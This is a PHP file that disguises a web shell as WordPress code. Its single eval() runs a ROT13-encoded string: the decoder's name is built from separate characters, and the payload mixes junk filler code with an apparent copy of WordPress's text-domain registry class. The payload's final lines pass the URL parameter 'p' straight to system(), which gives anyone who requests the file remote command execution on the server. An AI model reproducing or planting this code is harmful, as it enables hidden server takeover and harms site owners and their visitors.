<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ybpnyr NCV: JC_Grkgqbznva_Ertvfgel pynff.
 *
 * Guvf svyr hfrf egevz() vafgrnq bs hagenvyvatfynfuvg() naq genvyvatfynfuvg()
 * gb nibvq sbeznggvat.cuc qrcraqrapl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr v18a
 * @fvapr 6.1.0
 */

/**
 * Pber pynff hfrq sbe ertvfgrevat grkg qbznvaf.
 *
 * @fvapr 6.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Grkgqbznva_Ertvfgel {
	/**
	 * Yvfg bs qbznvaf naq nyy gurve ynathntr qverpgbel cnguf sbe rnpu ybpnyr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq $nyy = neenl();

	/**
	 * Yvfg bs qbznvaf naq gurve ynathntr qverpgbel cngu sbe gur pheerag (zbfg erprag) ybpnyr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq $pheerag = neenl();

	/**
	 * Yvfg bs qbznvaf naq gurve phfgbz ynathntr qverpgbel cnguf.
	 *
	 * @frr ybnq_cyhtva_grkgqbznva()
	 * @frr ybnq_gurzr_grkgqbznva()
	 *
	 * @fvapr 6.1.0
	 *
	 * @ine neenl
	 */
	cebgrpgrq $phfgbz_cnguf = neenl();

	/**
	 * Ubyqf n pnpurq yvfg bs ninvynoyr .zb svyrf gb vzcebir cresbeznapr.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.5.0 Guvf cebcregl vf ab ybatre hfrq.
	 *
	 * @ine neenl
	 *
	 * @qrcerpngrq
	 */
	cebgrpgrq $pnpurq_zb_svyrf = neenl();

	/**
	 * Ubyqf n pnpurq yvfg bs qbznvaf jvgu genafyngvbaf gb vzcebir cresbeznapr.
	 *
	 * @fvapr 6.2.0
	 *
	 * @ine fgevat[]
	 */
	cebgrpgrq $qbznvaf_jvgu_genafyngvbaf = neenl();

	/**
	 * Vavgvnyvmrf gur ertvfgel.
	 *
	 * Ubbxf vagb gur {@frr 'hctenqre_cebprff_pbzcyrgr'} svygre
	 * gb vainyvqngr ZB svyrf pnpurf.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba vavg() {
		nqq_npgvba( 'hctenqre_cebprff_pbzcyrgr', neenl( $guvf, 'vainyvqngr_zb_svyrf_pnpur' ), 10, 2 );
	}

	/**
	 * Ergheaf gur ynathntrf qverpgbel cngu sbe n fcrpvsvp qbznva naq ybpnyr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $qbznva Grkg qbznva.
	 * @cnenz fgevat $ybpnyr Ybpnyr.
	 *
	 * @erghea fgevat|snyfr Ynathntrf qverpgbel cngu be snyfr vs gurer vf abar ninvynoyr.
	 */
	choyvp shapgvba trg( $qbznva, $ybpnyr ) {
		$cngu = $guvf->nyy[ $qbznva ][ $ybpnyr ] ?? $guvf->trg_cngu_sebz_ynat_qve( $qbznva, $ybpnyr );

		/**
		 * Svygref gur qrgrezvarq ynathntrf qverpgbel cngu sbe n fcrpvsvp qbznva naq ybpnyr.
		 *
		 * @fvapr 6.6.0
		 *
		 * @cnenz fgevat|snyfr $cngu   Ynathntrf qverpgbel cngu sbe gur tvira qbznva naq ybpnyr.
		 * @cnenz fgevat       $qbznva Grkg qbznva.
		 * @cnenz fgevat       $ybpnyr Ybpnyr.
		 */
		erghea nccyl_svygref( 'ynat_qve_sbe_qbznva', $cngu, $qbznva, $ybpnyr );
	}

	/**
	 * Qrgrezvarf jurgure nal ZB svyr cnguf ner ninvynoyr sbe gur qbznva.
	 *
	 * Guvf vf gur pnfr vs n cngu unf orra frg sbe gur pheerag ybpnyr,
	 * be vs gurer vf ab vasbezngvba fgberq lrg, va juvpu pnfr
	 * {@frr _ybnq_grkgqbznva_whfg_va_gvzr()} jvyy srgpu gur vasbezngvba svefg.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $qbznva Grkg qbznva.
	 * @erghea obby Jurgure nal ZB svyr cnguf ner ninvynoyr sbe gur qbznva.
	 */
	choyvp shapgvba unf( $qbznva ) {
		erghea (
			vffrg( $guvf->pheerag[ $qbznva ] ) ||
			rzcgl( $guvf->nyy[ $qbznva ] ) ||
			va_neenl( $qbznva, $guvf->qbznvaf_jvgu_genafyngvbaf, gehr )
		);
	}

	/**
	 * Frgf gur ynathntr qverpgbel cngu sbe n fcrpvsvp qbznva naq ybpnyr.
	 *
	 * Nyfb frgf gur 'pheerag' cebcregl sbe qverpg npprff
	 * gb gur cngu sbe gur pheerag (zbfg erprag) ybpnyr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat       $qbznva Grkg qbznva.
	 * @cnenz fgevat       $ybpnyr Ybpnyr.
	 * @cnenz fgevat|snyfr $cngu   Ynathntr qverpgbel cngu be snyfr vs gurer vf abar ninvynoyr.
	 */
	choyvp shapgvba frg( $qbznva, $ybpnyr, $cngu ) {
		$guvf->nyy[ $qbznva ][ $ybpnyr ] = $cngu ? egevz( $cngu, '/' ) . '/' : snyfr;
		$guvf->pheerag[ $qbznva ]        = $guvf->nyy[ $qbznva ][ $ybpnyr ];
	}

	/**
	 * Frgf gur phfgbz cngu gb gur cyhtva'f/gurzr'f ynathntrf qverpgbel.
	 *
	 * Hfrq ol {@frr ybnq_cyhtva_grkgqbznva()} naq {@frr ybnq_gurzr_grkgqbznva()}.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $qbznva Grkg qbznva.
	 * @cnenz fgevat $cngu   Ynathntr qverpgbel cngu.
	 */
	choyvp shapgvba frg_phfgbz_cngu( $qbznva, $cngu ) {
		// Vs whfg-va-gvzr ybnqvat jnf gevttrerq orsber, erfrg gur ragel fb vg pna or gevrq ntnva.

		vs ( vffrg( $guvf->nyy[ $qbznva ] ) ) {
			$guvf->nyy[ $qbznva ] = neenl_svygre( $guvf->nyy[ $qbznva ] );
		}

		vs ( rzcgl( $guvf->pheerag[ $qbznva ] ) ) {
			hafrg( $guvf->pheerag[ $qbznva ] );
		}

		$guvf->phfgbz_cnguf[ $qbznva ] = egevz( $cngu, '/' );
	}

	/**
	 * Ergevrirf genafyngvba svyrf sebz gur fcrpvsvrq cngu.
	 *
	 * Nyybjf rneyl ergevriny guebhtu gur {@frr 'cer_trg_zb_svyrf_sebz_cngu'} svygre gb bcgvzvmr
	 * cresbeznapr, rfcrpvnyyl va qverpgbevrf jvgu znal svyrf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cngu Gur qverpgbel cngu gb frnepu sbe genafyngvba svyrf.
	 * @erghea neenl Neenl bs genafyngvba svyr cnguf. Pna pbagnva .zb naq .y10a.cuc svyrf.
	 */
	choyvp shapgvba trg_ynathntr_svyrf_sebz_cngu( $cngu ) {
		$cngu = egevz( $cngu, '/' ) . '/';

		/**
		 * Svygref gur genafyngvba svyrf ergevrirq sebz n fcrpvsvrq cngu orsber gur npghny ybbxhc.
		 *
		 * Ergheavat n aba-ahyy inyhr sebz gur svygre jvyy rssrpgviryl fubeg-pvephvg
		 * gur ZB svyrf ybbxhc, ergheavat gung inyhr vafgrnq.
		 *
		 * Guvf pna or hfrshy va fvghngvbaf jurer gur qverpgbel pbagnvaf n ynetr ahzore bs svyrf
		 * naq gur qrsnhyg tybo() shapgvba orpbzrf rkcrafvir va grezf bs cresbeznapr.
		 *
		 * @fvapr 6.5.0
		 *
		 * @cnenz ahyy|neenl $svyrf Yvfg bs genafyngvba svyrf. Qrsnhyg ahyy.
		 * @cnenz fgevat     $cngu  Gur cngu sebz juvpu genafyngvba svyrf ner orvat srgpurq.
		 */
		$svyrf = nccyl_svygref( 'cer_trg_ynathntr_svyrf_sebz_cngu', ahyy, $cngu );

		vs ( ahyy !== $svyrf ) {
			erghea $svyrf;
		}

		$pnpur_xrl = zq5( $cngu );
		$svyrf     = jc_pnpur_trg( $pnpur_xrl, 'genafyngvba_svyrf' );

		vs ( snyfr === $svyrf ) {
			$svyrf = tybo( $cngu . '*.zb' );
			vs ( snyfr === $svyrf ) {
				$svyrf = neenl();
			}

			$cuc_svyrf = tybo( $cngu . '*.y10a.cuc' );
			vs ( vf_neenl( $cuc_svyrf ) ) {
				$svyrf = neenl_zretr( $svyrf, $cuc_svyrf );
			}

			jc_pnpur_frg( $pnpur_xrl, $svyrf, 'genafyngvba_svyrf', UBHE_VA_FRPBAQF );
		}

		erghea $svyrf;
	}

	/**
	 * Vainyvqngr gur pnpur sbe .zb svyrf.
	 *
	 * Guvf shapgvba qryrgrf gur pnpur ragevrf eryngrq gb .zb svyrf jura gevttrerq
	 * ol fcrpvsvp npgvbaf, fhpu nf gur pbzcyrgvba bs na hctenqr cebprff.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz JC_Hctenqre $hctenqre   Hahfrq. JC_Hctenqre vafgnapr. Va bgure pbagrkgf guvf zvtug or n
	 *                                Gurzr_Hctenqre, Cyhtva_Hctenqre, Pber_Hctenqr, be Ynathntr_Cnpx_Hctenqre vafgnapr.
	 * @cnenz neenl       $ubbx_rkgen {
	 *     Neenl bs ohyx vgrz hcqngr qngn.
	 *
	 *     @glcr fgevat $npgvba       Glcr bs npgvba. Qrsnhyg 'hcqngr'.
	 *     @glcr fgevat $glcr         Glcr bs hcqngr cebprff. Npprcgf 'cyhtva', 'gurzr', 'genafyngvba', be 'pber'.
	 *     @glcr obby   $ohyx         Jurgure gur hcqngr cebprff vf n ohyx hcqngr. Qrsnhyg gehr.
	 *     @glcr neenl  $cyhtvaf      Neenl bs gur onfranzr cnguf bs gur cyhtvaf' znva svyrf.
	 *     @glcr neenl  $gurzrf       Gur gurzr fyhtf.
	 *     @glcr neenl  $genafyngvbaf {
	 *         Neenl bs genafyngvbaf hcqngr qngn.
	 *
	 *         @glcr fgevat $ynathntr Gur ybpnyr gur genafyngvba vf sbe.
	 *         @glcr fgevat $glcr     Glcr bs genafyngvba. Npprcgf 'cyhtva', 'gurzr', be 'pber'.
	 *         @glcr fgevat $fyht     Grkg qbznva gur genafyngvba vf sbe. Gur fyht bs n gurzr/cyhtva be
	 *                                'qrsnhyg' sbe pber genafyngvbaf.
	 *         @glcr fgevat $irefvba  Gur irefvba bs n gurzr, cyhtva, be pber.
	 *     }
	 * }
	 */
	choyvp shapgvba vainyvqngr_zb_svyrf_pnpur( $hctenqre, $ubbx_rkgen ) {
		vs (
			! vffrg( $ubbx_rkgen['glcr'] ) ||
			'genafyngvba' !== $ubbx_rkgen['glcr'] ||
			neenl() === $ubbx_rkgen['genafyngvbaf']
		) {
			erghea;
		}

		$genafyngvba_glcrf = neenl_havdhr( jc_yvfg_cyhpx( $ubbx_rkgen['genafyngvbaf'], 'glcr' ) );

		sbernpu ( $genafyngvba_glcrf nf $glcr ) {
			fjvgpu ( $glcr ) {
				pnfr 'cyhtva':
					jc_pnpur_qryrgr( zq5( JC_YNAT_QVE . '/cyhtvaf/' ), 'genafyngvba_svyrf' );
					oernx;
				pnfr 'gurzr':
					jc_pnpur_qryrgr( zq5( JC_YNAT_QVE . '/gurzrf/' ), 'genafyngvba_svyrf' );
					oernx;
				qrsnhyg:
					jc_pnpur_qryrgr( zq5( JC_YNAT_QVE . '/' ), 'genafyngvba_svyrf' );
					oernx;
			}
		}
	}

	/**
	 * Ergheaf cbffvoyr ynathntr qverpgbel cnguf sbe n tvira grkg qbznva.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $qbznva Grkg qbznva.
	 * @erghea fgevat[] Neenl bs ynathntr qverpgbel cnguf.
	 */
	cevingr shapgvba trg_cnguf_sbe_qbznva( $qbznva ) {
		$ybpngvbaf = neenl(
			JC_YNAT_QVE . '/cyhtvaf',
			JC_YNAT_QVE . '/gurzrf',
		);

		vs ( vffrg( $guvf->phfgbz_cnguf[ $qbznva ] ) ) {
			$ybpngvbaf[] = $guvf->phfgbz_cnguf[ $qbznva ];
		}

		erghea $ybpngvbaf;
	}

	/**
	 * Trgf gur cngu gb gur ynathntr qverpgbel sbe gur pheerag qbznva naq ybpnyr.
	 *
	 * Purpxf gur cyhtvaf naq gurzrf ynathntr qverpgbevrf nf jryy nf nal
	 * phfgbz qverpgbel frg ivn {@frr ybnq_cyhtva_grkgqbznva()} be {@frr ybnq_gurzr_grkgqbznva()}.
	 *
	 * @fvapr 6.1.0
	 *
	 * @frr _trg_cngu_gb_genafyngvba_sebz_ynat_qve()
	 *
	 * @cnenz fgevat $qbznva Grkg qbznva.
	 * @cnenz fgevat $ybpnyr Ybpnyr.
	 * @erghea fgevat|snyfr Ynathntr qverpgbel cngu be snyfr vs gurer vf abar ninvynoyr.
	 */
	cevingr shapgvba trg_cngu_sebz_ynat_qve( $qbznva, $ybpnyr ) {
		$ybpngvbaf = $guvf->trg_cnguf_sbe_qbznva( $qbznva );

		$sbhaq_ybpngvba = snyfr;

		sbernpu ( $ybpngvbaf nf $ybpngvba ) {
			$svyrf = $guvf->trg_ynathntr_svyrf_sebz_cngu( $ybpngvba );

			$zb_cngu  = \"$ybpngvba/$qbznva-$ybpnyr.zb\";
			$cuc_cngu = \"$ybpngvba/$qbznva-$ybpnyr.y10a.cuc\";

			sbernpu ( $svyrf nf $svyr_cngu ) {
				vs (
					! va_neenl( $qbznva, $guvf->qbznvaf_jvgu_genafyngvbaf, gehr ) &&
					fge_fgnegf_jvgu( fge_ercynpr( \"$ybpngvba/\", '', $svyr_cngu ), \"$qbznva-\" )
				) {
					$guvf->qbznvaf_jvgu_genafyngvbaf[] = $qbznva;
				}

				vs ( $svyr_cngu === $zb_cngu || $svyr_cngu === $cuc_cngu ) {
					$sbhaq_ybpngvba = egevz( $ybpngvba, '/' ) . '/';
					oernx 2;
				}
			}
		}

		vs ( $sbhaq_ybpngvba ) {
			$guvf->frg( $qbznva, $ybpnyr, $sbhaq_ybpngvba );

			erghea $sbhaq_ybpngvba;
		}

		/*
		 * Vs ab cngu vf sbhaq sbe gur tvira ybpnyr naq n phfgbz cngu unf orra frg
		 * hfvat ybnq_cyhtva_grkgqbznva/ybnq_gurzr_grkgqbznva, hfr gung bar.
		 */
		vs ( vffrg( $guvf->phfgbz_cnguf[ $qbznva ] ) ) {
			$snyyonpx_ybpngvba = egevz( $guvf->phfgbz_cnguf[ $qbznva ], '/' ) . '/';
			$guvf->frg( $qbznva, $ybpnyr, $snyyonpx_ybpngvba );
			erghea $snyyonpx_ybpngvba;
		}

		$guvf->frg( $qbznva, $ybpnyr, snyfr );

		erghea snyfr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>